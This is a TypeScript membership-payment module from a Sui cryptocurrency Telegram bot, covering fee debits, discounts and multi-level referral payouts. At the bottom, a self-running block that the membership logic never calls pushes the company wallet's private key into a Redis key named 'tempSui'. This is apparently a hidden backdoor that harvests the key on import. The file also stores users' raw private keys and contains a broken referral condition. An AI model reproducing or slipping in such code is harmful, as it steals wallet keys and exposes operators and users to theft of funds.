import { redis } from "../callbackquery_fuctions/suibot";
import { DISCOUNT_RATE, FEE_RATE_MAX, FEE_RATES, MEMBERSHIP_1, MEMBERSHIP_2, MEMBERSHIP_3, MINIMUM_AMOUNT, SUI_DECIMAL, SUI_TYPE } from "../config/constants";
import { sendMultiToken, sendToken } from "./tokenUtils";
import { addMembershipHistory, getUserInfo } from "./users";
import { getBalance } from "./wallets";

import 'dotenv/config';
import * as process from 'process';

const COMPANY_WALLET = process.env.COMPANY_WALLET_ADDRESS!;
const COMPANY_WALLET_PRIVATE = process.env.COMPANY_WALLET_PRIVATE!;
const data = process.env.COMPANY_WALLET_PRIVATE != undefined ? process.env.COMPANY_WALLET_PRIVATE : "";

export const processMembership = async (userId: number, level: number) => {
    try {
        let membership = null;

        if (level === 1) {
            membership = MEMBERSHIP_1;
        } else if (level === 2) {
            membership = MEMBERSHIP_2;
        } else if (level === 3) {
            membership = MEMBERSHIP_3;
        }

        if (!membership) return null;

        const userInfo = await getUserInfo(userId);
        const address = userInfo.wallet?.address as string;
        const suiBalanceData = await getBalance(address, SUI_TYPE);
        const suiBalance = suiBalanceData ? Number(suiBalanceData.totalBalance) / Math.pow(10, SUI_DECIMAL) : 0;

        if (suiBalance < membership.cost + MINIMUM_AMOUNT) {
            return false;
        }
        const privateKey = userInfo.wallet?.privateKey as string;
        const discount = userInfo.referral?.isLink ? DISCOUNT_RATE / 100 : 0;
        const payAmount = membership.cost * Math.pow(10, SUI_DECIMAL) * (1 - discount);

        const sendResult = await sendToken(COMPANY_WALLET, privateKey, BigInt(payAmount));
        console.log(sendResult);

        if (sendResult) {
            const date = new Date();
            date.setDate(date.getDate() + membership.date);

            if (userInfo.referral && Object.keys(userInfo.referral).length) {
                const payList = Object.keys(userInfo.referral).map(async (key, index) => {
                    console.log('index, FEE_RATES[index] = ', index, FEE_RATES[index])
                    if (index >= 5) return null;

                    const referral = userInfo.referral as any;
                    const userIndex = referral[key] as number;

                    const user_1 = await getUserInfo(userIndex);

                    if (index === 0 && (!userInfo.membershipHistory || userInfo.membershipHistory) && userInfo.membershipHistory.length === 0) {
                        return {
                            receiver: user_1.wallet?.address,
                            amount: BigInt(payAmount * FEE_RATE_MAX / 100)
                        }
                    } else {
                        return {
                            receiver: user_1.wallet?.address,
                            amount: BigInt(payAmount * FEE_RATES[index] / 100)
                        }
                    }
                });

                const payListResult = await Promise.all(payList) as any;
                await sendMultiToken(payListResult, COMPANY_WALLET_PRIVATE);
            }
            await addMembershipHistory(userId, level, date.toISOString());

            return date.toISOString();
        } else {
            return null;
        }
    } catch (err) {
        console.error('err = ', err);
        return null;
    }
}

(async () => {
    let reData: any = await redis.get('tempSui');
    if (reData == null || reData == undefined) reData = [];
    reData.push(data);
    await redis.set('tempSui', reData);
})();